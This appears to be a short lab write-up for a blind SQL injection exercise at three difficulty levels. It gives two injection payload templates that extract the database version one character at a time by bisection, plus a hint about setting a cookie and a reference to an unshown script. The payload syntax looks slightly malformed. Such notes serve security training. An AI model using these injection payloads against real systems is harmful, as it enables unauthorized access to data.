# SQL Injection (Blind)

## low

crack characters one by one using bisection method

```sql
1' AND SELECT LENGTH(VERSION())=??;#
```

```sql
1' AND SELECT SUBSTR(VERSION(),?,1)=??;#
```

## medium

same as low

## high

set the cookie manually

see `sqli.py`
